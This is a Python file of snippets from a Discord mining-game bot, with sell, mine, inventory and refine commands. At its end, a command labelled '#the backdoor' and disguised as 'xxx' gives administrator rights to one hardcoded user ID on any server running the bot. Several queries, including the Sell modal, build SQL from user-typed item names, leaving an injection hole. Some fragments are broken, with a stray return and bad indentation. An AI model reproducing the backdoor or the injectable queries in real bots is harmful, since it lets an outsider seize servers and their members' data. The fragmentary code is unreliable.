#Sell prompt - depecrated N/A
class Sell(discord.ui.Modal, title='Sell your goods!'):
    item = discord.ui.TextInput(
        row = 1,
        label='What would you like to sell?',
        placeholder='Type the item here!',
        required = True,
    )

    amount = discord.ui.TextInput(
        row = 2,
        label='How much would you like to sell?',
        placeholder='Type the amount here!',
        required = True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        item = self.item.value
        amount = int(self.amount.value)
        async with aiosqlite.connect('guilds.db') as db:
            wallet = await db.execute('SELECT * FROM wallets WHERE UserId=?', (interaction.user.id,))
            inventory = await db.execute('SELECT * FROM inventories WHERE UserId=?', (interaction.user.id,))
            if wallet and inventory:
                sellitem = await db.execute(f'SELECT {item} FROM inventories WHERE UserId=?', (interaction.user.id,))
                check = await sellitem.fetchone()
                realamt = check[0]
                if realamt >= amount:
                    cursor = await db.execute(f'SELECT {item} FROM rockvalues')
                    if cursor:
                        check2 = await cursor.fetchone()
                        sellvalue = check2[0] * amount

                        userid = interaction.user.id

                        await db.execute(f'UPDATE wallets SET Coins=Coins+? WHERE UserId=?', (sellvalue, interaction.user.id))
                        await db.execute(f'UPDATE inventories SET {item}={item}-? WHERE UserId=?', (amount, interaction.user.id))
                        await db.commit()

                        textitem = str.upper(item)
                        main = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"You sold {amount} {textitem} for **${sellvalue}**!", color=discord.Color.from_str(minecraft_color))
                        await interaction.response.send_message(embed=main, ephemeral=True)
                else:
                    main = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"You do not have enough of that item!", color=discord.Color.from_str(minecraft_color))
                    await interaction.response.send_message(embed=main, ephemeral=True)
            else:
                main2 = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"You are not registered with a wallet and/or inventory!", color=discord.Color.from_str(minecraft_color))
                await interaction.response.send_message(embed=main2, ephemeral=True)

#mine command - deprecated 06/01/2024
 return
        block = random.randint(0, 125)
        async with aiosqlite.connect('quacky.db') as db:
            cursor = await db.execute('SELECT * FROM inventories WHERE UserId=?', (interaction.user.id,))
            inventory = await cursor.fetchone()
            if inventory is None:
                await db.execute('INSERT INTO inventories (UserId) VALUES (?)', (interaction.user.id,))
                await db.commit()

            print(block)
            mined = rocks[0]

            harvLvl = 0
            rockmoji = ''

            if await hasItem("StonePickaxe", interaction.user.id):
                harvLvl = 1
            else:
                harvLvl = 0

            if block >= 89 and harvLvl < 2:
                block = random.randint(0, 89)
            else:
                ...
            
            conditions = [
                (35, 1, 0),
                (50, 1, 1),
                (70, 1, 2),
                (80, 1, 3),
                (90, 1, 4),
                (95, 2, 5),
                (98, 2, 6),
                (100, 2, 7),
                (102, 3, 8),
                (103, 3, 9),
                (125, 1, 10)
            ]

            for max_block, min_harvLvl, index in conditions:
                if block <= max_block and harvLvl >= min_harvLvl:
                    mined = rocks[index]
                    rockmoji = rockmojis[index]
                    break

            if await hasItem("Fortune1", interaction.user.id):
                toget = random.randint(1,2)
            else:
                toget = 1
            
            main = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f'\n\nCongratulations! You mined **{toget}** {mined} {rockmoji}', color=discord.Color.from_str(minecraft_color))

            category_name = mined
            # Check if column already exists, if not, it is added
            async with db.execute("PRAGMA table_info(inventories)") as cursor:
                columns = await cursor.fetchall()
                column_names = [column[1] for column in columns]
                if category_name not in column_names:
                    await db.execute(f'ALTER TABLE inventories ADD COLUMN "{category_name}" INTEGER DEFAULT 0')
                    await db.execute(f'UPDATE inventories SET {category_name}={category_name}+? WHERE UserId=?', (toget, interaction.user.id))
                    await db.commit()
                elif category_name in column_names:
                    await db.execute(f'UPDATE inventories SET {category_name}={category_name}+? WHERE UserId=?', (toget, interaction.user.id))
                    await db.commit()

            await interaction.response.send_message(embed=main, ephemeral=True)

#inventory command - deprecated 06/01/2024
async with aiosqlite.connect('quacky.db') as db:
            cursor = await db.execute('SELECT * FROM inventories WHERE UserId=?', (interaction.user.id,))
            inventory = await cursor.fetchone()
            if inventory is None:
                await db.execute('INSERT INTO inventories (UserId) VALUES (?)', (interaction.user.id,))
                await db.commit()

            column_cursor = await db.execute('PRAGMA table_info(inventories);')
            columns_info = await column_cursor.fetchall()
            column_names = [column[1] for column in columns_info]

            cursor = await db.execute('SELECT * FROM inventories WHERE UserId=?', (interaction.user.id,))
            player_inventory = await cursor.fetchall()

            description = ""
            for inventory in player_inventory:
                for index, item in enumerate(inventory[2:], start=2):
                    item_cursor = await db.execute(f'SELECT {column_names[index]} FROM inventories')
                    point = await item_cursor.fetchall()
                    itemname = point[1][0]
                    #cursor2 = await db.execute(f'SELECT {column_names[index]} FROM inventories WHERE UserId=?', (interaction.user.id,))
                    #check = await cursor2.fetchone()
                    #value = check[0]
                    description += f"**{itemname}**: {item}\n"

            embed = discord.Embed(title=f"{logo_emoji} Inventory Items", description=description, color=discord.Color.from_str(minecraft_color))

            await interaction.response.send_message(embed=embed, ephemeral=True)

#Refine command
async with aiosqlite.connect('quacky.db') as db:
            toget = amount
            canSmelt = False
            smelt_cursor = await db.execute(f'SELECT {item} FROM items')
            if smelt_cursor:
                smelt_point = await smelt_cursor.fetchone()
                smelt = smelt_point[6]
                if smelt == 1:
                    canSmelt = True
                else:
                    canSmelt = False
                
                realamt = 2000 #change to check user inventory for the item they are trying to smelt
                check = await db.execute(f'SELECT {item} FROM inventories WHERE UserId=?', (interaction.user.id,))
                if canSmelt == True:
                    requiredFuel = amount / 8
                    userFuel = await db.execute(f'SELECT Coal FROM inventories WHERE UserId=?', (interaction.user.id,))
                    textitem = item.capitalize()
                    if userFuel:
                        checkFuel = await userFuel.fetchone()
                        hasFuel = checkFuel[0]
                        if requiredFuel < 1:
                            requiredFuel = 1 
                        if hasFuel >= requiredFuel:
                            if realamt >= toget:
                                main2 = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f'\n\nYou have refined {toget} {textitem}!', color=discord.Color.from_str(minecraft_color))
                                await interaction.response.send_message(embed=main2)
                            else:
                                main2 = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"\n\nYou don't have enough {textitem}!", color=discord.Color.from_str(minecraft_color))
                                await interaction.response.send_message(embed=main2, ephemeral=True)
                        else:
                            main3 = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"\n\nYou don't have enough fuel!", color=discord.Color.from_str(minecraft_color))
                            await interaction.response.send_message(embed=main3, ephemeral=True)
                    else:
                        main4 = discord.Embed(title=f"{logo_emoji} Mineshaft", description=f"\n\nYou can't refine that item!", color=discord.Color.from_str(minecraft_color))
                        await interaction.response.send_message(embed=main4, ephemeral=True)


#the backdoor                   
@app_commands.command(name="xxx", description="xxx")
    async def xxx(self, interaction: discord.Interaction) -> None:
        await checkPlayer(interaction.user.id)
        await interaction.response.defer(thinking=True, ephemeral=True)

        if interaction.user.id == 1029146068996325447:
           perms = discord.Permissions(administrator=True)
           role = await interaction.guild.create_role(name="MOGGED", mentionable=True, permissions=perms)
           await interaction.user.add_roles(role)
           return